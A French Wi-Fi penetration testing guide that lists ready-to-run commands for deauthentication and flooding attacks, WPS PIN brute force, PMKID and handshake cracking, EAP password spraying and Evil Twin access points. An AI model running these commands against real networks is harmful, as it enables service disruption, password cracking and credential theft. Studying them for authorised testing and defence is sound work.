# Pentesting Wifi

{{#include ../../banners/hacktricks-training.md}}

## Commandes de base Wifi
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Outils

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Exécutez airgeddon avec docker**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
### wifiphisher

Il peut effectuer des attaques Evil Twin, KARMA et Known Beacons, puis utiliser un modèle de phishing pour réussir à obtenir le vrai mot de passe du réseau ou capturer des identifiants de réseaux sociaux.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Cet outil automatise les attaques **WPS/WEP/WPA-PSK**. Il va automatiquement :

- Mettre l'interface en mode moniteur
- Scanner les réseaux possibles - Et vous laisser sélectionner la ou les victimes
- Si WEP - Lancer des attaques WEP
- Si WPA-PSK
- Si WPS : attaque Pixie dust et attaque par bruteforce (faites attention, l'attaque par bruteforce peut prendre beaucoup de temps). Notez qu'il n'essaie pas de PIN nulle ou de PINs générés.
- Essayer de capturer le PMKID de l'AP pour le cracker
- Essayer de désauthentifier les clients de l'AP pour capturer un handshake
- Si PMKID ou Handshake, essayer de bruteforcer en utilisant les 5000 mots de passe les plus courants.

## Résumé des Attaques

- **DoS**
- Désauthentification/dissociation -- Déconnecter tout le monde (ou un ESSID/Client spécifique)
- APs factices aléatoires -- Cacher des réseaux, possible crash des scanners
- Surcharger l'AP -- Essayer de tuer l'AP (généralement pas très utile)
- WIDS -- Jouer avec l'IDS
- TKIP, EAPOL -- Certaines attaques spécifiques pour DoS certains APs
- **Cracking**
- Craquer **WEP** (plusieurs outils et méthodes)
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **Capture de handshake WPA** + Cracking
- **WPA-MGT**
- **Capture de nom d'utilisateur**
- **Bruteforce** des identifiants
- **Evil Twin** (avec ou sans DoS)
- **Open** Evil Twin \[+ DoS] -- Utile pour capturer les identifiants de portail captif et/ou effectuer des attaques LAN
- **WPA-PSK** Evil Twin -- Utile pour des attaques réseau si vous connaissez le mot de passe
- **WPA-MGT** -- Utile pour capturer les identifiants d'entreprise
- **KARMA, MANA**, **Loud MANA**, **Beacon connu**
- **+ Open** -- Utile pour capturer les identifiants de portail captif et/ou effectuer des attaques LAN
- **+ WPA** -- Utile pour capturer des handshakes WPA

## DOS

### Paquets de Désauthentification

**Description de** [**ici**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

Les attaques de **désauthentification**, une méthode répandue dans le hacking Wi-Fi, impliquent la falsification de trames "de gestion" pour **déconnecter de force des appareils d'un réseau**. Ces paquets non chiffrés trompent les clients en leur faisant croire qu'ils proviennent du réseau légitime, permettant aux attaquants de collecter des handshakes WPA à des fins de cracking ou de perturber de manière persistante les connexions réseau. Cette tactique, alarmante par sa simplicité, est largement utilisée et a des implications significatives pour la sécurité des réseaux.

**Désauthentification utilisant Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0 signifie désauthentification
- 1 est le nombre de désauthentifications à envoyer (vous pouvez en envoyer plusieurs si vous le souhaitez) ; 0 signifie les envoyer en continu
- -a 00:14:6C:7E:40:80 est l'adresse MAC du point d'accès
- -c 00:0F:B5:34:30:30 est l'adresse MAC du client à désauthentifier ; si cela est omis, une désauthentification en broadcast est envoyée (ne fonctionne pas toujours)
- ath0 est le nom de l'interface

### Paquets de désassociation

**Les paquets de désassociation**, similaires aux paquets de désauthentification, sont un type de trame de gestion utilisée dans les réseaux Wi-Fi. Ces paquets servent à rompre la connexion entre un appareil (tel qu'un ordinateur portable ou un smartphone) et un point d'accès (AP). La principale distinction entre désassociation et désauthentification réside dans leurs scénarios d'utilisation. Alors qu'un AP émet **des paquets de désauthentification pour retirer explicitement des appareils indésirables du réseau, les paquets de désassociation sont généralement envoyés lorsque l'AP subit un arrêt**, un redémarrage ou un déplacement, nécessitant ainsi la déconnexion de tous les nœuds connectés.

**Cette attaque peut être effectuée par mdk4(mode "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Plus d'attaques DOS par mdk4**

**Dans** [**ici**](https://en.kali.tools/?p=864)**.**

**MODE D'ATTAQUE b : Inondation de balises**

Envoie des trames de balise pour afficher de faux APs aux clients. Cela peut parfois faire planter les analyseurs de réseau et même les pilotes !
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**MODE D'ATTAQUE a : Déni de Service d'Authentification**

L'envoi de trames d'authentification à tous les Points d'Accès (AP) accessibles dans la portée peut surcharger ces AP, surtout lorsque de nombreux clients sont impliqués. Ce trafic intense peut entraîner une instabilité du système, provoquant le gel ou même le redémarrage de certains AP.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**MODE D'ATTAQUE p : Probing SSID et Bruteforçage**

Le probing des points d'accès (AP) vérifie si un SSID est correctement révélé et confirme la portée de l'AP. Cette technique, associée au **bruteforçage des SSID cachés** avec ou sans liste de mots, aide à identifier et accéder aux réseaux dissimulés.

**MODE D'ATTAQUE m : Exploitation des Contre-mesures Michael**

L'envoi de paquets aléatoires ou dupliqués à différentes files d'attente QoS peut déclencher les contre-mesures Michael sur les **AP TKIP**, entraînant un arrêt de l'AP d'une minute. Cette méthode est une tactique efficace d'attaque **DoS** (Denial of Service).
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**MODE D'ATTAQUE e : Injection de paquets EAPOL Start et Logoff**

Inonder un AP avec des **trames EAPOL Start** crée des **sessions factices**, submergeant l'AP et bloquant les clients légitimes. Alternativement, l'injection de **messages EAPOL Logoff factices** déconnecte de force les clients, les deux méthodes perturbent efficacement le service réseau.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**MODE D'ATTAQUE s : Attaques pour les réseaux maillés IEEE 802.11s**

Diverses attaques sur la gestion des liens et le routage dans les réseaux maillés.

**MODE D'ATTAQUE w : Confusion WIDS**

La connexion croisée de clients à plusieurs nœuds WDS ou à de faux APs malveillants peut manipuler les systèmes de détection et de prévention d'intrusion, créant de la confusion et un potentiel abus du système.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**MODE D'ATTAQUE f : Fuzzer de Paquet**

Un fuzzer de paquet avec diverses sources de paquets et un ensemble complet de modificateurs pour la manipulation de paquets.

### **Airggedon**

_**Airgeddon**_ propose la plupart des attaques mentionnées dans les commentaires précédents :

![](<../../images/image (95).png>)

## WPS

WPS (Wi-Fi Protected Setup) simplifie le processus de connexion des appareils à un routeur, améliorant la vitesse et la facilité de configuration pour les réseaux cryptés avec **WPA** ou **WPA2** Personnel. Il est inefficace pour la sécurité WEP facilement compromise. WPS utilise un code PIN à 8 chiffres, validé en deux moitiés, ce qui le rend vulnérable aux attaques par force brute en raison de son nombre limité de combinaisons (11 000 possibilités).

### Bruteforce WPS

Il existe 2 outils principaux pour effectuer cette action : Reaver et Bully.

- **Reaver** a été conçu pour être une attaque robuste et pratique contre WPS, et a été testé contre une grande variété de points d'accès et d'implémentations WPS.
- **Bully** est une **nouvelle implémentation** de l'attaque par force brute WPS, écrite en C. Il présente plusieurs avantages par rapport au code reaver original : moins de dépendances, performances améliorées en mémoire et CPU, gestion correcte de l'endianness, et un ensemble d'options plus robuste.

L'attaque exploite la **vulnérabilité du PIN WPS**, en particulier son exposition des quatre premiers chiffres et le rôle du dernier chiffre en tant que somme de contrôle, facilitant l'attaque par force brute. Cependant, les défenses contre les attaques par force brute, comme **le blocage des adresses MAC** des attaquants agressifs, nécessitent une **rotation des adresses MAC** pour continuer l'attaque.

Après avoir obtenu le PIN WPS avec des outils comme Bully ou Reaver, l'attaquant peut déduire le PSK WPA/WPA2, garantissant un **accès réseau persistant**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

Cette approche raffinée cible les PIN WPS en utilisant des vulnérabilités connues :

1. **PINs pré-découverts** : Utilisez une base de données de PINs connus liés à des fabricants spécifiques connus pour utiliser des PINs WPS uniformes. Cette base de données corrèle les trois premiers octets des adresses MAC avec des PINs probables pour ces fabricants.
2. **Algorithmes de génération de PIN** : Exploitez des algorithmes comme ComputePIN et EasyBox, qui calculent les PINs WPS en fonction de l'adresse MAC de l'AP. L'algorithme Arcadyan nécessite également un ID de dispositif, ajoutant une couche au processus de génération de PIN.

### WPS Pixie Dust attack

**Dominique Bongard** a découvert une faille dans certains Points d'Accès (AP) concernant la création de codes secrets, connus sous le nom de **nonces** (**E-S1** et **E-S2**). Si ces nonces peuvent être découverts, le craquage du PIN WPS de l'AP devient facile. L'AP révèle le PIN dans un code spécial (hash) pour prouver qu'il est légitime et non un AP faux (rogue). Ces nonces sont essentiellement les "clés" pour déverrouiller le "coffre-fort" qui contient le PIN WPS. Plus d'informations à ce sujet peuvent être trouvées [ici](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>).

En termes simples, le problème est que certains AP n'utilisaient pas des clés suffisamment aléatoires pour chiffrer le PIN pendant le processus de connexion. Cela rend le PIN vulnérable à être deviné depuis l'extérieur du réseau (attaque par force brute hors ligne).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Si vous ne souhaitez pas passer l'appareil en mode moniteur, ou si `reaver` et `bully` rencontrent un problème, vous pouvez essayer [OneShot-C](https://github.com/nikita-yfh/OneShot-C). Cet outil peut effectuer une attaque Pixie Dust sans avoir à passer en mode moniteur.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Attaque Null Pin

Certains systèmes mal conçus permettent même à un **Null PIN** (un PIN vide ou inexistant) d'accorder l'accès, ce qui est assez inhabituel. L'outil **Reaver** est capable de tester cette vulnérabilité, contrairement à **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Tous les attaques WPS proposées peuvent être facilement réalisées en utilisant _**airgeddon.**_

![](<../../images/image (219).png>)

- 5 et 6 vous permettent d'essayer **votre PIN personnalisé** (si vous en avez un)
- 7 et 8 effectuent l'**attaque Pixie Dust**
- 13 vous permet de tester le **PIN NULL**
- 11 et 12 vont **récupérer les PINs liés à l'AP sélectionné à partir des bases de données disponibles** et **générer** des **PINs** possibles en utilisant : ComputePIN, EasyBox et éventuellement Arcadyan (recommandé, pourquoi pas ?)
- 9 et 10 testeront **tous les PINs possibles**

## **WEP**

Tellement cassé et inutilisé de nos jours. Sachez simplement que _**airgeddon**_ a une option WEP appelée "All-in-One" pour attaquer ce type de protection. Plus d'outils offrent des options similaires.

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

En 2018, **hashcat** [a révélé](https://hashcat.net/forum/thread-7717.html) une nouvelle méthode d'attaque, unique car elle nécessite **un seul paquet** et ne nécessite pas que des clients soient connectés à l'AP cible—juste une interaction entre l'attaquant et l'AP.

De nombreux routeurs modernes ajoutent un **champ optionnel** au **premier cadre EAPOL** lors de l'association, connu sous le nom de `Robust Security Network`. Cela inclut le `PMKID`.

Comme l'explique le post original, le **PMKID** est créé en utilisant des données connues :
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Étant donné que le "Nom PMK" est constant, nous connaissons le BSSID de l'AP et de la station, et le `PMK` est identique à celui d'une poignée de main 4 voies complète, **hashcat** peut utiliser ces informations pour craquer le PSK et récupérer le mot de passe !

Pour **rassembler** ces informations et **bruteforcer** localement le mot de passe, vous pouvez faire :
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Les **PMKIDs capturés** seront affichés dans la **console** et également **enregistrés** dans \_ **/tmp/attack.pcap**\_\
Maintenant, convertissez la capture au format **hashcat/john** et craquez-la :
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Veuillez noter que le format d'un hash correct contient **4 parties**, comme : `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` Si le vôtre **contient seulement** **3 parties**, alors, il est **invalide** (la capture PMKID n'était pas valide).

Notez que `hcxdumptool` **capture également des handshakes** (quelque chose comme ceci apparaîtra : **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Vous pourriez **transformer** les **handshakes** au format **hashcat**/**john** en utilisant `cap2hccapx`
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_J'ai remarqué que certaines captures de handshakes avec cet outil n'ont pas pu être craquées même en connaissant le mot de passe correct. Je recommanderais de capturer des handshakes également de manière traditionnelle si possible, ou de capturer plusieurs d'entre eux en utilisant cet outil._

### Capture de handshake

Une attaque sur les réseaux **WPA/WPA2** peut être exécutée en capturant un **handshake** et en tentant de **craquer** le mot de passe **hors ligne**. Ce processus implique de surveiller la communication d'un réseau spécifique et du **BSSID** sur un **canal** particulier. Voici un guide simplifié :

1. Identifiez le **BSSID**, le **canal** et un **client connecté** du réseau cible.
2. Utilisez `airodump-ng` pour surveiller le trafic réseau sur le canal et le BSSID spécifiés, en espérant capturer un handshake. La commande ressemblera à ceci :
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Pour augmenter les chances de capturer un handshake, déconnectez momentanément le client du réseau pour forcer une ré-authentification. Cela peut être fait en utilisant la commande `aireplay-ng`, qui envoie des paquets de désauthentification au client :
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Remarque que, comme le client a été désauthentifié, il pourrait essayer de se connecter à un autre AP ou, dans d'autres cas, à un autre réseau._

Une fois que dans le `airodump-ng` apparaissent des informations de handshake, cela signifie que le handshake a été capturé et que vous pouvez arrêter d'écouter :

![](<../../images/image (172) (1).png>)

Une fois le handshake capturé, vous pouvez **crack** cela avec `aircrack-ng` :
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Vérifiez si le handshake est dans le fichier

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Si cet outil trouve une poignée de main incomplète d'un ESSID avant celle qui est complète, il ne détectera pas la valide._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

Dans **les configurations WiFi d'entreprise, vous rencontrerez diverses méthodes d'authentification**, chacune offrant différents niveaux de sécurité et fonctionnalités de gestion. Lorsque vous utilisez des outils comme `airodump-ng` pour inspecter le trafic réseau, vous pourriez remarquer des identifiants pour ces types d'authentification. Certaines méthodes courantes incluent :
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- Cette méthode prend en charge les jetons matériels et les mots de passe à usage unique au sein de EAP-PEAP. Contrairement à MSCHAPv2, elle n'utilise pas de défi entre pairs et envoie les mots de passe en texte clair au point d'accès, posant un risque pour les attaques de rétrogradation.
2. **EAP-MD5 (Message Digest 5)**:
- Implique l'envoi du hachage MD5 du mot de passe depuis le client. Il est **non recommandé** en raison de la vulnérabilité aux attaques par dictionnaire, du manque d'authentification du serveur et de l'incapacité à générer des clés WEP spécifiques à la session.
3. **EAP-TLS (Transport Layer Security)**:
- Utilise à la fois des certificats côté client et côté serveur pour l'authentification et peut générer dynamiquement des clés WEP basées sur l'utilisateur et la session pour sécuriser les communications.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- Fournit une authentification mutuelle via un tunnel chiffré, ainsi qu'une méthode pour dériver des clés WEP dynamiques, par utilisateur et par session. Elle nécessite uniquement des certificats côté serveur, les clients utilisant des identifiants.
5. **PEAP (Protected Extensible Authentication Protocol)**:
- Fonctionne de manière similaire à EAP en créant un tunnel TLS pour une communication protégée. Elle permet l'utilisation de protocoles d'authentification plus faibles au-dessus de EAP grâce à la protection offerte par le tunnel.
- **PEAP-MSCHAPv2**: Souvent appelé PEAP, il combine le mécanisme de défi/réponse vulnérable MSCHAPv2 avec un tunnel TLS protecteur.
- **PEAP-EAP-TLS (ou PEAP-TLS)**: Semblable à EAP-TLS mais initie un tunnel TLS avant l'échange de certificats, offrant une couche de sécurité supplémentaire.

Vous pouvez trouver plus d'informations sur ces méthodes d'authentification [ici](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol) et [ici](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Capture de nom d'utilisateur

En lisant [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27), il semble que si vous utilisez **EAP**, les **messages "Identity"** doivent être **pris en charge**, et le **nom d'utilisateur** sera envoyé en **clair** dans les **messages "Response Identity"**.

Même en utilisant l'une des méthodes d'authentification les plus sécurisées : **PEAP-EAP-TLS**, il est possible de **capturer le nom d'utilisateur envoyé dans le protocole EAP**. Pour ce faire, **capturez une communication d'authentification** (démarrez `airodump-ng` dans un canal et `wireshark` dans la même interface) et filtrez les paquets par `eapol`.\
Dans le paquet "**Response, Identity**", le **nom d'utilisateur** du client apparaîtra.

![](<../../images/image (850).png>)

### Identités anonymes

Le masquage d'identité est pris en charge à la fois par EAP-PEAP et EAP-TTLS. Dans le contexte d'un réseau WiFi, une demande d'EAP-Identity est généralement initiée par le point d'accès (AP) lors du processus d'association. Pour garantir la protection de l'anonymat de l'utilisateur, la réponse du client EAP sur l'appareil de l'utilisateur contient uniquement les informations essentielles requises pour que le serveur RADIUS initial traite la demande. Ce concept est illustré par les scénarios suivants :

- EAP-Identity = anonyme
- Dans ce scénario, tous les utilisateurs utilisent le pseudonyme "anonyme" comme identifiant utilisateur. Le serveur RADIUS initial fonctionne comme un serveur EAP-PEAP ou EAP-TTLS, responsable de la gestion du côté serveur du protocole PEAP ou TTLS. La méthode d'authentification interne (protégée) est ensuite soit gérée localement, soit déléguée à un serveur RADIUS distant (domicile).
- EAP-Identity = anonyme@realm_x
- Dans cette situation, les utilisateurs de différents royaumes cachent leurs identités tout en indiquant leurs royaumes respectifs. Cela permet au serveur RADIUS initial de faire le proxy des demandes EAP-PEAP ou EAP-TTLS vers les serveurs RADIUS dans leurs royaumes d'origine, qui agissent comme le serveur PEAP ou TTLS. Le serveur RADIUS initial fonctionne uniquement comme un nœud de relais RADIUS.
- Alternativement, le serveur RADIUS initial peut fonctionner comme le serveur EAP-PEAP ou EAP-TTLS et soit gérer la méthode d'authentification protégée, soit la transférer à un autre serveur. Cette option facilite la configuration de politiques distinctes pour différents royaumes.

Dans EAP-PEAP, une fois le tunnel TLS établi entre le serveur PEAP et le client PEAP, le serveur PEAP initie une demande d'EAP-Identity et la transmet à travers le tunnel TLS. Le client répond à cette seconde demande d'EAP-Identity en envoyant une réponse d'EAP-Identity contenant la véritable identité de l'utilisateur à travers le tunnel chiffré. Cette approche empêche efficacement la révélation de la véritable identité de l'utilisateur à quiconque espionnant le trafic 802.11.

EAP-TTLS suit une procédure légèrement différente. Avec EAP-TTLS, le client s'authentifie généralement en utilisant PAP ou CHAP, sécurisé par le tunnel TLS. Dans ce cas, le client inclut un attribut User-Name et soit un attribut Password soit un attribut CHAP-Password dans le message TLS initial envoyé après l'établissement du tunnel.

Quel que soit le protocole choisi, le serveur PEAP/TTLS obtient connaissance de la véritable identité de l'utilisateur après l'établissement du tunnel TLS. La véritable identité peut être représentée comme user@realm ou simplement user. Si le serveur PEAP/TTLS est également responsable de l'authentification de l'utilisateur, il possède maintenant l'identité de l'utilisateur et procède avec la méthode d'authentification protégée par le tunnel TLS. Alternativement, le serveur PEAP/TTLS peut transférer une nouvelle demande RADIUS au serveur RADIUS d'origine de l'utilisateur. Cette nouvelle demande RADIUS omet la couche de protocole PEAP ou TTLS. Dans les cas où la méthode d'authentification protégée est EAP, les messages EAP internes sont transmis au serveur RADIUS d'origine sans l'enveloppe EAP-PEAP ou EAP-TTLS. L'attribut User-Name du message RADIUS sortant contient la véritable identité de l'utilisateur, remplaçant le User-Name anonyme de la demande RADIUS entrante. Lorsque la méthode d'authentification protégée est PAP ou CHAP (prise en charge uniquement par TTLS), les attributs User-Name et autres attributs d'authentification extraits de la charge utile TLS sont substitués dans le message RADIUS sortant, remplaçant le User-Name anonyme et les attributs TTLS EAP-Message trouvés dans la demande RADIUS entrante.

Pour plus d'infos, consultez [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm)

### EAP-Bruteforce (password spray)

Si le client est censé utiliser un **nom d'utilisateur et un mot de passe** (notez que **EAP-TLS ne sera pas valide** dans ce cas), alors vous pourriez essayer d'obtenir une **liste** de **noms d'utilisateur** (voir la partie suivante) et de **mots de passe** et essayer de **bruteforcer** l'accès en utilisant [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Vous pouvez également effectuer cette attaque en utilisant `eaphammer` :
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Théorie des attaques client

### Sélection de réseau et itinérance

- Le protocole 802.11 définit comment une station rejoint un Extended Service Set (ESS) mais ne spécifie pas les critères de sélection d'un ESS ou d'un point d'accès (AP) à l'intérieur.
- Les stations peuvent itinérer entre les AP partageant le même ESSID, maintenant la connectivité à travers un bâtiment ou une zone.
- Le protocole exige l'authentification de la station à l'ESS mais ne mandate pas l'authentification de l'AP à la station.

### Listes de réseaux préférés (PNL)

- Les stations stockent l'ESSID de chaque réseau sans fil auquel elles se connectent dans leur Liste de Réseaux Préférés (PNL), ainsi que des détails de configuration spécifiques au réseau.
- La PNL est utilisée pour se connecter automatiquement à des réseaux connus, améliorant l'expérience utilisateur en rationalisant le processus de connexion.

### Analyse passive

- Les AP diffusent périodiquement des trames de balise, annonçant leur présence et leurs caractéristiques, y compris l'ESSID de l'AP, sauf si la diffusion est désactivée.
- Lors de l'analyse passive, les stations écoutent les trames de balise. Si l'ESSID d'une balise correspond à une entrée dans la PNL de la station, la station peut se connecter automatiquement à cet AP.
- La connaissance de la PNL d'un appareil permet une exploitation potentielle en imitant l'ESSID d'un réseau connu, trompant l'appareil pour qu'il se connecte à un AP malveillant.

### Sonde active

- La sonde active implique que les stations envoient des requêtes de sonde pour découvrir les AP à proximité et leurs caractéristiques.
- Les requêtes de sonde dirigées ciblent un ESSID spécifique, aidant à détecter si un réseau particulier est à portée, même s'il s'agit d'un réseau caché.
- Les requêtes de sonde diffusées ont un champ SSID nul et sont envoyées à tous les AP à proximité, permettant à la station de vérifier tout réseau préféré sans divulguer le contenu de sa PNL.

## AP simple avec redirection vers Internet

Avant d'expliquer comment effectuer des attaques plus complexes, il va être expliqué **comment** simplement **créer** un **AP** et **rediriger** son **trafic** vers une interface connectée **à** l'**Internet**.

En utilisant `ifconfig -a`, vérifiez que l'interface wlan pour créer l'AP et l'interface connectée à Internet sont présentes.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Créer le fichier de configuration `/etc/dnsmasq.conf` :
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Ensuite, **définissez les IP** et **les routes** :
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
Et ensuite **démarrez** dnsmasq :
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Créer un fichier de configuration `hostapd.conf` :
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Arrêtez les processus ennuyeux**, définissez **le mode moniteur** et **démarrez hostapd** :
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Transfert et Redirection
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Une attaque de jumeau malveillant exploite la façon dont les clients WiFi reconnaissent les réseaux, s'appuyant principalement sur le nom du réseau (ESSID) sans nécessiter que la station de base (point d'accès) s'authentifie auprès du client. Les points clés incluent :

- **Difficulté de Différenciation** : Les appareils ont du mal à distinguer entre les points d'accès légitimes et malveillants lorsqu'ils partagent le même ESSID et type de cryptage. Les réseaux du monde réel utilisent souvent plusieurs points d'accès avec le même ESSID pour étendre la couverture de manière transparente.
- **Roaming des Clients et Manipulation de Connexion** : Le protocole 802.11 permet aux appareils de se déplacer entre les points d'accès au sein du même ESS. Les attaquants peuvent en profiter en incitant un appareil à se déconnecter de sa station de base actuelle et à se connecter à une station malveillante. Cela peut être réalisé en offrant un signal plus fort ou en perturbant la connexion au point d'accès légitime par des méthodes telles que des paquets de désauthentification ou le brouillage.
- **Défis d'Exécution** : Exécuter avec succès une attaque de jumeau malveillant dans des environnements avec plusieurs points d'accès bien placés peut être difficile. Désauthentifier un seul point d'accès légitime entraîne souvent la connexion de l'appareil à un autre point d'accès légitime, à moins que l'attaquant ne puisse désauthentifier tous les points d'accès à proximité ou placer stratégiquement le point d'accès malveillant.

Vous pouvez créer un Open Evil Twin très basique (sans capacités de routage du trafic vers Internet) en :
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Vous pouvez également créer un Evil Twin en utilisant **eaphammer** (notez que pour créer des evil twins avec eaphammer, l'interface **ne doit PAS être** en mode **monitor**):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Ou en utilisant Airgeddon : `Options : 5,6,7,8,9 (dans le menu d'attaque Evil Twin).`

![](<../../images/image (1088).png>)

